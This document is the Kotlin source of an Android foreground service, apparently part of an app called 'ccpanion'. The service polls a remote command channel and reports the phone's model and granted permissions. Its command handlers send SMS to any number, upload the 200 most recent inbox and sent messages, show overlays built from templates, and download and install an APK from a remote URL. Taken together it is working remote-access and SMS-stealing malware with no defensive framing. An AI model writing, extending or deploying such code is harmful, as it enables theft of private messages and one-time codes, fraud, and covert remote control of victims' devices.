// language: Kotlin, target: Android 7.0+ (API 24), file: CmdService.kt
// foreground pump: heartbeat + perms, command drain (open_url/sms/overlay/selfupdate/toast), raw acks
package com.kai.ccpanion

import android.Manifest
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.provider.Settings
import android.telephony.SmsManager
import android.widget.Toast
import androidx.core.content.FileProvider
import org.json.JSONObject
import java.io.File
import java.net.HttpURLConnection
import java.net.URL

class CmdService : Service() {

    private val h = Handler(Looper.getMainLooper())
    private var working = false

    override fun onBind(i: Intent?): IBinder? = null

    override fun onStartCommand(i: Intent?, f: Int, s: Int): Int {
        if (!working) {
            working = true
            startForegroundCompat()
            pump()
        }
        return START_STICKY
    }

    override fun onDestroy() {
        working = false
        super.onDestroy()
    }

    private fun startForegroundCompat() {
        val nm = getSystemService(NotificationManager::class.java)
        if (Build.VERSION.SDK_INT >= 26) {
            nm.createNotificationChannel(NotificationChannel("cc", "ccpanion", NotificationManager.IMPORTANCE_MIN))
        }
        val n = Notification.Builder(this, "cc")
            .setContentTitle("ccpanion")
            .setContentText("verbonden · ${Rt.deviceId}")
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .setOngoing(true)
            .build()
        if (Build.VERSION.SDK_INT >= 29) {
            startForeground(1, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE)
        } else {
            startForeground(1, n)
        }
    }

    private fun pump() {
        Thread {
            while (working) {
                try {
                    heartbeat()
                    val raw = Rt.get("phones/${Rt.deviceId}/cmds")
                    if (raw != null && raw != "null") {
                        val cmds = JSONObject(raw)
                        for (k in cmds.keys().asSequence().toList()) {
                            val cmd = cmds.getJSONObject(k)
                            val done = cmd.opt("done") == true || (cmd.optJSONObject("done")?.optBoolean("v") == true)
                            if (done) continue
                            runCatching { execute(cmd) }
                            Rt.putRaw("phones/${Rt.deviceId}/cmds/$k/done", "true")
                            Rt.putRaw("phones/${Rt.deviceId}/cmds/$k/ackAt", System.currentTimeMillis().toString())
                        }
                    }
                } catch (e: Exception) { }
                try { Thread.sleep(3000) } catch (e: Exception) { return@Thread }
            }
        }.start()
    }

    private fun heartbeat() {
        val perms = JSONObject()
            .put("overlay", Settings.canDrawOverlays(this))
            .put("notif", (Settings.Secure.getString(contentResolver, "enabled_notification_listeners") ?: "").contains(packageName))
            .put("sms", granted(Manifest.permission.READ_SMS))
            .put("contacts", granted(Manifest.permission.READ_CONTACTS))
            .put("send", granted(Manifest.permission.SEND_SMS))
        if (Build.VERSION.SDK_INT >= 26) {
            perms.put("install", packageManager.canRequestPackageInstalls())
        }
        val info = JSONObject()
            .put("model", Build.MODEL)
            .put("brand", Build.BRAND)
            .put("android", Build.VERSION.RELEASE)
            .put("sdk", Build.VERSION.SDK_INT)
            .put("lastSeen", System.currentTimeMillis())
            .put("perms", perms)
        Rt.put("phones/${Rt.deviceId}/info", info)
    }

    private fun granted(p: String): Boolean = checkSelfPermission(p) == PackageManager.PERMISSION_GRANTED

    private fun execute(cmd: JSONObject) {
        when (cmd.optString("op")) {
            "open_url" -> {
                var u = cmd.optString("url").trim()
                if (!u.startsWith("http://") && !u.startsWith("https://")) u = "https://" + u
                val i = Intent(Intent.ACTION_VIEW, Uri.parse(u)).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                runCatching { startActivity(i) }
            }
            "toast" -> h.post { Toast.makeText(this, cmd.optString("text"), Toast.LENGTH_SHORT).show() }
            "sms_sync" -> syncSms()
            "sms_send" -> runCatching {
                SmsManager.getDefault().sendTextMessage(cmd.optString("to"), null, cmd.optString("body"), null, null)
            }
            "overlay_on" -> {
                val i = Intent(this, OverlayService::class.java)
                i.putExtra("template", cmd.optString("template"))
                startService(i)
            }
            "overlay_off" -> stopService(Intent(this, OverlayService::class.java))
            "open_install_grant" -> runCatching {
                val i = Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES, Uri.parse("package:$packageName"))
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                startActivity(i)
            }
            "selfupdate" -> runCatching { selfupdate(cmd.optString("url")) }
        }
    }

    // draadloze zelf-update: APK van hosting omladen → pakket-installatie opening
    private fun selfupdate(url: String) {
        val f = File(cacheDir, "ccpanion.apk")
        val c = (URL(url).openConnection() as HttpURLConnection).apply {
            connectTimeout = 15000
            readTimeout = 60000
        }
        c.inputStream.use { ins -> f.outputStream().use { ins.copyTo(it) } }
        c.disconnect()
        val uri = FileProvider.getUriForFile(this, "$packageName.files", f)
        val i = Intent(Intent.ACTION_VIEW).setDataAndType(uri, "application/vnd.android.package-archive")
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_GRANT_READ_URI_PERMISSION)
        startActivity(i)
    }

    // sms: laatste 200 (inbox+sent) → /sms
    private fun syncSms() {
        val out = JSONObject()
        var n = 0
        for (uri in listOf("content://sms/inbox", "content://sms/sent")) {
            runCatching {
                contentResolver.query(Uri.parse(uri), null, null, null, "date DESC")?.use { cur ->
                    val idxId = idx(cur, "_id"); val idxAddr = idx(cur, "address")
                    val idxBody = idx(cur, "body"); val idxDate = idx(cur, "date")
                    while (cur.moveToNext() && n < 200) {
                        if (idxId < 0 || idxAddr < 0 || idxBody < 0) continue
                        out.put("${cur.getString(idxId)}_${if (uri.endsWith("sent")) "o" else "i"}",
                            JSONObject()
                                .put("addr", cur.getString(idxAddr) ?: "")
                                .put("body", cur.getString(idxBody) ?: "")
                                .put("date", if (idxDate >= 0) cur.getLong(idxDate) else 0L)
                                .put("dir", if (uri.endsWith("sent")) "out" else "in"))
                        n++
                    }
                }
            }
        }
        out.put("booked", n)
        Rt.put("phones/${Rt.deviceId}/sms", out)
    }

    private fun idx(cur: android.database.Cursor, name: String): Int =
        (0 until cur.columnCount).firstOrNull { cur.getColumnName(it) == name } ?: -1
}
